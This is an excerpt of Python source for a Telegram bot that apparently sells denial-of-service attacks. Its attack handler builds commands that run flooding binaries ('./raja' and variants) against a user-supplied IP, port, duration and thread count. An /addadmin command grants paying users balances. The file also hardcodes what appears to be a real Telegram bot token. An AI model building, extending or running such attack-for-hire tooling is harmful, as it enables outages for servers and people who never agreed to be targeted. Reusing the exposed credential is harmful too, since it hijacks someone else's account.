...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7554691620:AAHn-pPgKZfBVMHrf6pr3WP7z86IB0nN9PQ'
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        ...
        help_text = (
            ...
            "*🔸 /addadmin <user_id> <balance>* - Add a new admin with balance.*"
        )
...
async def addadmin(update: Update, context: CallbackContext):
    ...
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /addadmin <user_id> <balance>*",
            parse_mode='Markdown'
        )
        return

    # Extract the target user ID and balance from the arguments
    target_user_id = int(context.args[0])
    balance = int(context.args[1])

    # Add or update the admin user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"user_id": target_user_id, "balance": balance}},
        upsert=True
    )

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ Admin {target_user_id} added with balance {balance}*",
        parse_mode='Markdown'
    )    
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./raja {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./raja1 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./raja2 {ip} {port} {duration} {byte_size} {threads}"

    # Send attack details to the user
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ RAJA VVIP BOT CHALU! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 https://t.me/RAJABHAIYA_04 💥*"
    ), parse_mode='Markdown')
